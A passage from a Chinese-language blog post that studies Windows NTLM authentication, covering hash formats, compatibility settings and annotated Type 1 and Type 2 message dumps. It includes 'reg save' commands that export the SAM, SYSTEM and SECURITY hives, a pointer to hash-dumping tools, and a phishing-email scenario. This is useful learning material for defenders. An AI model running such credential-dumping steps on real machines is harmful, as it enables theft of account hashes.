class="toc-number">6.</span> <span class="toc-text">0x06 总结</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">atsud0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-03-07T06:18:41.000Z" class="dt-published" itemprop="datePublished">2022-03-07</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Note/">Note</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/NTLM/" rel="tag">NTLM</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>本文主要简单介绍下NTLM协议和基于NTLM的攻击手法，主要是对以下文章的学习、以及记录学习心得和利用方法。(NTLM Relay部分还没写完)</p>
<p>参考文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Archive/drops2/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Hash%20%26amp%3B%20Pass%20The%20Key.html">https://paper.seebug.org/papers/Archive/drops2/域渗透——Pass The Hash %26amp%3B Pass The Key.html</a></li>
<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">https://3gstudent.github.io/Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ping_Pig/article/details/109171690">https://blog.csdn.net/Ping_Pig&#x2F;article&#x2F;details&#x2F;109171690</a></li>
<li><a target="_blank" rel="noopener" href="https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/">https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd835564(v=ws.10)">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd835564(v=ws.10)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/220740.html">KB22871997是否真的能防御PTH攻击？</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction">https://docs.microsoft.com/en-US/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction</a></li>
<li><a target="_blank" rel="noopener" href="https://en.hackndo.com/pass-the-hash/">https://en.hackndo.com/pass-the-hash/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/ntlm/pth#practice">https://www.thehacker.recipes/ad/movement/ntlm/pth</a></li>
<li><a target="_blank" rel="noopener" href="https://web.archive.org/web/20210615151251/https://research.801labs.org/cracking-an-ntlmv2-hash/">https://web.archive.org/web/20210615151251/https://research.801labs.org/cracking-an-ntlmv2-hash/</a></li>
<li><a target="_blank" rel="noopener" href="http://davenport.sourceforge.net/ntlm.html">http://davenport.sourceforge.net/ntlm.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193149">Windows内网协议学习NTLM篇之NTLM基础介绍</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/archive/blogs/apgceps/ntlm-2">NTLM协议（一）——面向连接认证</a></li>
</ul>
<p>如果英语能力OK的话 十分推荐将这篇文章<a target="_blank" rel="noopener" href="http://davenport.sourceforge.net/ntlm.html">http://davenport.sourceforge.net/ntlm.html</a> 和微软的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4">MS-NLMP</a>文档一起阅读</p>
<h1 id="0x01-NTLM-介绍"><a href="#0x01-NTLM-介绍" class="headerlink" title="0x01 NTLM 介绍"></a>0x01 NTLM 介绍</h1><p>Windows 认证主要分为Kerberos认证和NTLM认证。</p>
<p>Windows内部是不保存密码的，保存的是密码的hash值（如同Linux一般），本机用户的密码文件自然是存放在SAM文件中。</p>
<p>文件位置在：<code>%SystemRoot%\system32\config\SAM</code></p>
<p>在注册表中的存储位置为:<code>hklm\sam\sam\domains\account\users\</code>下(必须使用SYSTEM权限才能看到)</p>
<p><img src="https://images.atsud0.me/images/post/20220228-15:31:18-_vpkMkk_mRzv6f_vpkMkk_1646033478972_vpkMkk_mRzv6f.png" alt="https://images.atsud0.me/images/post/20220228-15:31:18-_vpkMkk_mRzv6f_vpkMkk_1646033478972_vpkMkk_mRzv6f.png"></p>
<p>我们可以通过导出注册表的方式来获取<code>sam</code>、<code>system</code>数据库的备份。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.save</span><br><span class="line">reg save hklm\system system.save</span><br><span class="line">reg save hklm\security security.save</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220228-15:40:43-_8x6WWc_boz5xT_8x6WWc_1646034043979_8x6WWc_boz5xT.png" alt="https://images.atsud0.me/images/post/20220228-15:40:43-_8x6WWc_boz5xT_8x6WWc_1646034043979_8x6WWc_boz5xT.png"></p>
<p>我们可以使用<code>impacket-secretdump.py</code>脚本来导出密码存储哈希(当然也可以直接使用<code>mimikatz</code>等工具)</p>
<p><img src="https://images.atsud0.me/images/post/20220228-15:44:46-_x0Tos9_iAnp7z_x0Tos9_1646034286903_x0Tos9_iAnp7z.png" alt="https://images.atsud0.me/images/post/20220228-15:44:46-_x0Tos9_iAnp7z_x0Tos9_1646034286903_x0Tos9_iAnp7z.png"></p>
<p>这里我们可以发现存储用户的密码的格式为:<code>uid:rid:lmhash:nthash</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:35b5a70f68f5ef895d52d15d8d84af6b:::</span><br></pre></td></tr></table></figure>

<p>UID即 Windows的登录用户名，这个很好理解。RID则是SID的一部分，500-999为保留，一般是Windows内置的，标准用户RID从1000开始。</p>
<h2 id="Windows本地认证流程"><a href="#Windows本地认证流程" class="headerlink" title="Windows本地认证流程"></a>Windows本地认证流程</h2><p>前面说到<code>SAM</code>文件是存储用户密码哈希值的地方，所以当我们进行本地登录的时候，Windows的认证流程应该是</p>
<p>用户本地登录 -&gt; <code>winlogon.exe</code> 显示登录界面之类的 -&gt; 用户输入用户密码登录 -&gt; <code>lsass.exe</code> 加密用户输入的密码 计算<code>hash</code> 和<code>SAM</code>中进行对比。 </p>
<h2 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h2><p><code>LM Hash</code> 全称<code>LAN Manager Hash</code>是Windows使用的最古老的密码存储，其历史可追溯到1980年代的OS &#x2F; 2。在LAN Manager协议中使用，由于允许的字符集有限，因此它们很容易破解。由于LM Hash存在的问题微软在1993年引入了NT Hash。在Windows 2000版本至2003的版本系统默认使用LM哈希，当密码超过14位时，则使用NT Hash进行存储。而在Windows Visita后，默认情况下只存储NT Hash，LM Hash则不再使用。如果用户密码为空或者不存储LM Hash的话，我们抓到的LM Hash是<code>AAD3B435B51404EEAAD3B435B51404EE</code>。</p>
<p>所以在Visita后，抓到的LM Hash为<code>AAD3B435B51404EEAAD3B435B51404EE</code>，并没有价值。（部分工具的参数需要填写固定格式<code>LM hash:NT hash</code>，可以将LM hash填0(LM hash可以为任意值)，即<code>00000000000000000000000000000000:NT hash</code>）</p>
<p>相关策略配置:本地组策略→本地策略→安全选项→网络安全:在下一次更改密码时不存储LAN管理器哈希值</p>
<p><img src="https://images.atsud0.me/images/post/20220301-10:30:55-_HfbweE_q6Vsgl_HfbweE_1646101855969_HfbweE_q6Vsgl.png" alt="https://images.atsud0.me/images/post/20220301-10:30:55-_HfbweE_q6Vsgl_HfbweE_1646101855969_HfbweE_q6Vsgl.png"></p>
<p>注册表位置: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\NoLmHash</code></p>
<p><img src="https://images.atsud0.me/images/post/20220301-10:31:55-_fMzxOs_xDKbQF_fMzxOs_1646101915860_fMzxOs_xDKbQF.png" alt="https://images.atsud0.me/images/post/20220301-10:31:55-_fMzxOs_xDKbQF_fMzxOs_1646101915860_fMzxOs_xDKbQF.png"></p>
<h2 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h2><p>Vista之后Windows系统使用的Hash，它的前身是LM Hash，两者相差不大，只是使用的加密算法不同。在Visita系统后默认使用。</p>
<h3 id="NTLM-Hash加密方法"><a href="#NTLM-Hash加密方法" class="headerlink" title="NTLM Hash加密方法"></a>NTLM Hash加密方法</h3><ol>
<li>将用户输入的密码转换成十六进制。假设用户密码为Admin123456，则转换后为<code>41646d696e313233343536</code></li>
<li>将其转换为unicode格式即为：<code>410064006d0069006e00310032003300340035003600</code></li>
<li>使用md4加密值为<code>ae4c0d5fb959fda8f4cb1d14a8376af4</code></li>
</ol>
<p><img src="https://images.atsud0.me/images/post/20220301-18:16:13-_oshcu8_4qRkdF_oshcu8_1646129773098_oshcu8_4qRkdF.png" alt="https://images.atsud0.me/images/post/20220301-18:16:13-_oshcu8_4qRkdF_oshcu8_1646129773098_oshcu8_4qRkdF.png"></p>
<p>和存储在SAM文件里面的哈希值相同</p>
<p><img src="https://images.atsud0.me/images/post/20220301-18:17:37-_r48hWR_9sNQND_r48hWR_1646129857957_r48hWR_9sNQND.png" alt="https://images.atsud0.me/images/post/20220301-18:17:37-_r48hWR_9sNQND_r48hWR_1646129857957_r48hWR_9sNQND.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;Admin123456&quot;</span></span><br><span class="line">unicode_hex_passwd = passwd.encode(<span class="string">&#x27;utf-16le&#x27;</span>)</span><br><span class="line">md4_passwd=hashlib.new(<span class="string">&quot;md4&quot;</span>,unicode_hex_passwd).digest()</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(md4_passwd))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通常可以在Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash</p>
<h2 id="Net-NTLM-hash"><a href="#Net-NTLM-hash" class="headerlink" title="Net-NTLM hash"></a><strong>Net-NTLM hash</strong></h2><p>Net-NTLM Hash通常是指在网络环境中在NTLM认证过程Type3（响应阶段）中的Response（NTProofStr）、Blob和Type2阶段（质询阶段）的ServerChallenge、用户名、请求的域名拼接而成的值。<br>格式为（Net-NTLM v2）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:server challenge:response(HMAC-MD5):blob</span><br></pre></td></tr></table></figure>

<p>但Response通常有以下几种类型:</p>
<ul>
<li>LM Response， 早期使用的响应类型</li>
<li>LMv2 Response ，在启用NTLMv2系统上将替换LM响应。</li>
<li>NTLM v1 Response ，基于Windows NT客户端，如Windows 2000 、XP。</li>
<li>NTLM v2 Response ，Windows NT Service Pack 4引入的响应类型，在NTLMv2启用的系统上将替换NTLM响应。</li>
<li>NTLM2 Session Response， 用于在没有NTLMv2身份验证的情况下协商NTLM2会话安全性时，此方案会更改LM NTLM响应的语义。</li>
<li>Anonymous Response，当匿名上下文正在建立时使用; 没有提供实际的证书，也没有真正的身份验证。“存根”字段显示在类型3消息中。</li>
</ul>
<p>这些响应可以在本地安全策略→本地策略→安全选项→网络安全：LAN管理器身份验证级别中配置。</p>
<p>注册表位置为：<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LmCompatibilityLevel</code></p>
<p><img src="https://images.atsud0.me/images/post/20220301-20:39:00-_XyXbuK_HvtmA4_XyXbuK_1646138340436_XyXbuK_HvtmA4.png" alt="https://images.atsud0.me/images/post/20220301-20:39:00-_XyXbuK_HvtmA4_XyXbuK_1646138340436_XyXbuK_HvtmA4.png"></p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Options</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>发送 LM NTLM 响应</td>
<td>客户端使用 LM 和 NTLM 身份验证，而决不会使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</td>
</tr>
<tr>
<td>1</td>
<td>发送 LM 和 NTLM - 如果已协商，则使用 NTLMv2 会话安全</td>
<td>客户端使用 LM 和 NTLM 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</td>
</tr>
<tr>
<td>2</td>
<td>仅发送 NTLM 响应</td>
<td>客户端只使用 NTLM 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</td>
</tr>
<tr>
<td>3</td>
<td>仅发送 NTLMv2 响应</td>
<td>客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</td>
</tr>
<tr>
<td>4</td>
<td>仅发送 NTLMv2 响应&#x2F;拒绝 LM</td>
<td>客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器拒绝 LM，而只接受 NTLM 和 NTLMv2 身份验证。</td>
</tr>
<tr>
<td>5</td>
<td>仅发送 NTLMv2 响应&#x2F;拒绝 LM 和 NTLM</td>
<td>客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器拒绝 LM 和 NTLM，而只接受 NTLMv2 身份验证。</td>
</tr>
</tbody></table>
<p>各系统的默认值为：</p>
<ul>
<li>Windows 2000 以及 Windows XP: 发送 LM &amp; NTLM 响应</li>
<li>Windows Server 2003: 仅发送 NTLM 响应</li>
<li>Windows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2及以上: 仅发送 NTLMv2 响应</li>
</ul>
<h2 id="NTLM-身份认证（NTLM-Challenge）"><a href="#NTLM-身份认证（NTLM-Challenge）" class="headerlink" title="NTLM 身份认证（NTLM Challenge）"></a>NTLM 身份认证（NTLM Challenge）</h2><h3 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h3><p>来假设一个场景</p>
<p>有这么一个人，她叫”纯酱、”。她是某公司财务部的人员。某一天早晨，她登录了自己的办公电脑，正打算开始今天的工作。突然收到一封邮件。</p>
<blockquote>
<p>Dear ….</p>
<p>由于近期xxx原因，微软官方于x年x月x日针对xxx发布了修复补丁。内部定义危险级别为严重，请各位员工立刻使用自己的内部帐号登录文件共享服务器10.1.1.5获取补丁进行更新。</p>
<p>信息技术部</p>
</blockquote>
<p>“纯酱、”同事作为遵守公司规则制度的好员工，那肯定立刻就登录上文件共享服务器获取补丁了啊。然后”纯酱、”输入了自己的帐号密码登录10.1.1.5了。</p>
<p>那么这里的认证流程及本是这样工作的。</p>
<p><img src="https://images.atsud0.me/images/post/20220303-15:42:21-_oHXLkL_95JTSO_oHXLkL_1646293341668_oHXLkL_95JTSO.png" alt="20220303-15:42:21-_oHXLkL_95JTSO_oHXLkL_1646293341668_oHXLkL_95JTSO"></p>
<p>1、纯酱用户登录客户端电脑</p>
<p>2、在客户端上请求服务端服务，并输入服务器要求的帐号密码。本地将会计算并缓存输入的密码的NTLM Hash。</p>
<p>3、Type1阶段协商 客户端向服务器发送Type1消息，主要包含客户端支持和向服务器端请求的功能列表。（并不会发送明文用户名）</p>
<p>4、Type2阶段质询 服务器收到客户端Type1消息的请求，作为回应会发送Type2消息请求给客户端，主要包含<strong>Server</strong> <strong>Challenge</strong>和服务器的功能信息。（Challenge是随机生成的16位字符串）</p>
<p>5、Type3阶段身份验证 客户端收到服务器Type2消息后，将会从Type2消息里面提 Server Challenge，用输入的密码NTLM-hash和Server Challenge进行加密运算（根据Flags设置 加密方式亦有所不同），得到Response。然后客户端将会把Type3消息发送给服务器。</p>
<p>6、服务器收到Type3消息后。将根据用户名来做进一步判断，如果是本地用户的话，会在SAM数据库里面拿这个用户的NTLM Hash，在客户端发送的Response字段提取相关的字段，进行和客户端几乎一样的加密运算，得出一个Response，服务器将会拿这个Response和Type3消息 客户端生成的Response进行对比，如果一致就验证通过。如果是域用户的话，服务器将会通过netlogon协议建立安全通道，将ServerChallenge、UserName、Response消息转发给域控。域控再去ntds.dit判断用户存不存在，然后DC将进行验证工作并把返回结果给服务器，服务器再根据DC的响应返回给客户端。</p>
<p>所以请求的用户是本地用户还是域用户的区别在于Type3阶段之后服务器的处理方式。</p>
<p>下面就是介绍三个过程中的部分细节。不感兴趣就可以忽略。</p>
<h3 id="Type-1-协商"><a href="#Type-1-协商" class="headerlink" title="Type 1 协商"></a>Type 1 协商</h3><p>这个过程主要就是客户端向服务端发送type1阶段的消息，以开启NTLM认证，并且通过一系列选项来设置身份验证规则，如果需要，它还可以告诉服务器客户端的工作站名称以及拥有的域（绝对不会发送明文用户名）。服务器可以用这些信息来确定客户端是否符合身份验证的条件。</p>
<p>阶段1的包文主要包含以下结构</p>
<table>
<thead>
<tr>
<th></th>
<th>Description</th>
<th>Content</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>NTLMSSP Signature</td>
<td>Null-terminated ASCII “NTLMSSP” (0x4e544c4d53535000)</td>
</tr>
<tr>
<td>8</td>
<td>NTLM Message Type</td>
<td>long (0x01000000)</td>
</tr>
<tr>
<td>12</td>
<td>Flags</td>
<td>long</td>
</tr>
<tr>
<td>(16)</td>
<td>Supplied Domain (Optional)</td>
<td>security buffer</td>
</tr>
<tr>
<td>(24)</td>
<td>Supplied Workstation (Optional)</td>
<td>security buffer</td>
</tr>
<tr>
<td>(32)</td>
<td>OS Version Structure (Optional)</td>
<td>8 bytes</td>
</tr>
<tr>
<td>(32) (40)</td>
<td>start of data block (if required)</td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://images.atsud0.me/images/post/20220301-21:15:32-_h1tR3I_zv7H2l_h1tR3I_1646140532145_h1tR3I_zv7H2l.png" alt="https://images.atsud0.me/images/post/20220301-21:15:32-_h1tR3I_zv7H2l_h1tR3I_1646140532145_h1tR3I_zv7H2l.png"></p>
<p>抓包信息如下：</p>
<p><img src="https://images.atsud0.me/images/post/20220301-21:20:25-_Je0FhI_Lq7hM1_Je0FhI_1646140825982_Je0FhI_Lq7hM1.png" alt="https://images.atsud0.me/images/post/20220301-21:20:25-_Je0FhI_Lq7hM1_Je0FhI_1646140825982_Je0FhI_Lq7hM1.png"></p>
<p>Signature (8 bytes):  8字节 必须包含字符数组：(‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\0’)</p>
<p>MessageType (4 bytes): 表示消息类型，值必须为0x0000001。</p>
<p>Negotiate Flags : NEGOTIATE结构体，相关的配置选项。结构体内的每个字段详细的含义都可以在<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832">https://docs.microsoft.com/zh-cn/openspecs/windows_protocols&#x2F;ms-nlmp&#x2F;99d90ff4-957f-4c8a-80e4-5bfe5a9a9832</a>和<a target="_blank" rel="noopener" href="http://davenport.sourceforge.net/ntlm.html#theNtlmFlags">http://davenport.sourceforge.net/ntlm.html#theNtlmFlags</a>了解。</p>
<p>Version字段取决于Negotiate Flags结构中的Negotiate Version的值。如果该值为0，则不会显示Version字段，并且该字段是否存在都不影响NTLM消息的处理。</p>
<p><img src="https://images.atsud0.me/images/post/20220302-14:27:16-_W6dhps_pYcwxs_W6dhps_1646202436067_W6dhps_pYcwxs.png" alt="https://images.atsud0.me/images/post/20220302-14:27:16-_W6dhps_pYcwxs_W6dhps_1646202436067_W6dhps_pYcwxs.png"></p>
<p>如果该值为1，Version字段也会在包文中出现，并且内容基本上是为winver.exe的内容。</p>
<p>Version字段结构</p>
<table>
<thead>
<tr>
<th></th>
<th>Description</th>
<th>Content</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>Major Version Number</td>
<td>1 byte</td>
</tr>
<tr>
<td>1</td>
<td>Minor Version Number</td>
<td>1 byte</td>
</tr>
<tr>
<td>2</td>
<td>Build Number</td>
<td>short</td>
</tr>
<tr>
<td>4</td>
<td>NTLMRevisionCurrent</td>
<td>0x0000000f</td>
</tr>
</tbody></table>
<p><img src="https://images.atsud0.me/images/post/20220302-14:28:07-_M36GP0_mbSgS2_M36GP0_1646202487769_M36GP0_mbSgS2.png" alt="https://images.atsud0.me/images/post/20220302-14:28:07-_M36GP0_mbSgS2_M36GP0_1646202487769_M36GP0_mbSgS2.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220302-14:31:47-_rFI2jh_N3vREr_rFI2jh_1646202707844_rFI2jh_N3vREr.png" alt="https://images.atsud0.me/images/post/20220302-14:31:47-_rFI2jh_N3vREr_rFI2jh_1646202707844_rFI2jh_N3vREr.png"></p>
<p>还有其他的字段解释：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2">NEGOTIATE_MESSAGE</a></p>
<p>下面是一个十六进制Type1阶段的消息（关于Flag的值可以看这里：<a target="_blank" rel="noopener" href="http://davenport.sourceforge.net/ntlm.html#theNtlmFlags%EF%BC%89%EF%BC%9A">http://davenport.sourceforge.net/ntlm.html#theNtlmFlags）：</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line">4e544c4d5353500001000000050288a000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">0x4e544c4d53535000 NTLMSSP签名（固定格式）</span><br><span class="line">0x01000000 消息类型，这里是阶段1的消息类型</span><br><span class="line">0x050288a0 = 0xa0880205（以小端（低位在前）的字节排序）</span><br><span class="line"></span><br><span class="line">05=Negotiate Unicode（0x00000001） + Request Target</span><br><span class="line">（0x00000004）</span><br><span class="line">02=Negotiate NTLM（0x00000200）</span><br><span class="line">88=Negotiate NTLM2 Key(NEGOTIATE_EXTENDED_SESSIONSECURITY 0x00080000) + Negotiate Target Info（0x00800000）</span><br><span class="line">a0=Negotiate 56（0x80000000） + Negotiate 128（0x20000000）</span><br><span class="line"></span><br><span class="line">Flags的值中，没有表示设置了Negotiate Domain Supplied、Negotiate Workstation Supplied以及Version的值，所以后面没有SecurityBuffer、Version等字段</span><br></pre></td></tr></table></figure>

<p>客户端发送Type1消息后，服务器将会分析消息，并发送一个回复（Type2消息）</p>
<h3 id="Type-2-质询"><a href="#Type-2-质询" class="headerlink" title="Type 2 质询"></a>Type 2 质询</h3><p>Type2 消息由服务器发送给客户端，响应Type1消息，主要<strong>包含服务器生成的Challenge</strong>，并且包含Type1消息协商时的相关信息。</p>
<p>阶段2的包文主要包含以下结构</p>
<table>
<thead>
<tr>
<th></th>
<th>Description</th>
<th>Content</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>NTLMSSP Signature</td>
<td>Null-terminated ASCII “NTLMSSP” (0x4e544c4d53535000)</td>
</tr>
<tr>
<td>8</td>
<td>NTLM Message Type</td>
<td>long (0x02000000)</td>
</tr>
<tr>
<td>12</td>
<td>Target Name</td>
<td>security buffer</td>
</tr>
<tr>
<td>20</td>
<td>Flags</td>
<td>long</td>
</tr>
<tr>
<td>24</td>
<td>Challenge</td>
<td>8 bytes</td>
</tr>
<tr>
<td>(32)</td>
<td>Context (Optional)</td>
<td>8 bytes (two consecutive longs)</td>
</tr>
<tr>
<td>(40)</td>
<td>Target Information (Optional)</td>
<td>security buffer</td>
</tr>
<tr>
<td>(48)</td>
<td>OS Version Structure (Optional)</td>
<td>8 bytes</td>
</tr>
<tr>
<td>32 (48) (56)</td>
<td>start of data block</td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://images.atsud0.me/images/post/20220302-17:08:29-_TLt0Oj_FNHeyA_TLt0Oj_1646212109114_TLt0Oj_FNHeyA.png" alt="20220302-17:08:29-_TLt0Oj_FNHeyA_TLt0Oj_1646212109114_TLt0Oj_FNHeyA"></p>
<p>Signature (8 bytes):  8字节 必须包含字符数组：(‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\0’)</p>
<p>MessageType (4 bytes): 表示消息类型，值必须为0x0000002。</p>
<p>Negotiate Flags(4 bytes) : NEGOTIATE结构体，相关的配置选项。和Type1消息的Negotiate Flags大致相同，不过是表示服务器支持的选项，如果有negotate_message则表示从客户端提供的选项做选择。</p>
<p>Target Name  包含身份验证目标的名称，通常是响应客户端在Type1消息中Flags中的Request Target选项。</p>
<p>ServerChallenge(8 bytes):随机生成的16位随机值。</p>
<p>Reserved (8 bytes):发送时必须设为0，接受时必须被忽略。</p>
<p>TargetInfoFields(8 bytes)：值的内容通常取决于NTLMSSP_NEGOTIATE_TARGET_INFO标志有没有被设置（注：除Windows NT，Windows 2000，Windows XP和Windows Server 2003之外，始终发送TargetInfo字段。）。</p>
<p>要想理解每个字段的详细信息，还是建议去阅读：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786">CHALLENGE_MESSAGE</a>以及<a target="_blank" rel="noopener" href="http://davenport.sourceforge.net/ntlm.html#theType2Message">The Type 2 Message</a><br>。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">例子</span><br><span class="line">4e544c4d53535000020000000800080038000000050289a2dea8b919645716230000000000000000a200a200400000000601b11d0000000f4400430030003100020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80100000000</span><br><span class="line"></span><br><span class="line">0x4e544c4d53535000 NTLMSSP签名</span><br><span class="line"></span><br><span class="line">02000000 = 00000002 消息类型</span><br><span class="line">0x0800 = 0x0008 TargetNameLen</span><br><span class="line"></span><br><span class="line">0x0800 = 0x0008 TargetNameMaxLen</span><br><span class="line"></span><br><span class="line">0x38000000 = 0x00000038  TargetNameBufferOffset</span><br><span class="line"></span><br><span class="line">0x050289a2 = 0xa2890205  NegotiateFlags</span><br><span class="line"></span><br><span class="line">05=Negotiate Unicode（0x00000001） + Request Target（0x00000004）</span><br><span class="line"></span><br><span class="line">02=Negotiate NTLM（0x00000200）</span><br><span class="line"></span><br><span class="line">89=Negotiate NTLM2 Key(NEGOTIATE_EXTENDED_SESSIONSECURITY 0x00080000) + Negotiate Target Info（0x00800000）+ Target Type Domain （0x00010000）</span><br><span class="line"></span><br><span class="line">a2=Negotiate 56（0x80000000） + Negotiate 128（0x20000000）+ Version（0x02000000）</span><br><span class="line"></span><br><span class="line">dea8b91964571623 Server Challenge（随机16位）</span><br><span class="line"></span><br><span class="line">0000000000000000 Reserved</span><br><span class="line"></span><br><span class="line">a200a20040000000 TargetInfoFields</span><br><span class="line"></span><br><span class="line">a200 = 0x00a2  TargetInfoLen</span><br><span class="line">a200 =0x00a2 TargetInfoMaxLen</span><br><span class="line">40000000 = 0x00000040 TargetInfoOffset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0601b11d0000000f Version</span><br><span class="line"></span><br><span class="line">06=0x06 Major Version</span><br><span class="line">01=0x01 Minor Version</span><br><span class="line">b11d=0x1db1 Build</span><br><span class="line">000000  Reseved</span><br><span class="line">0f = 0x0f 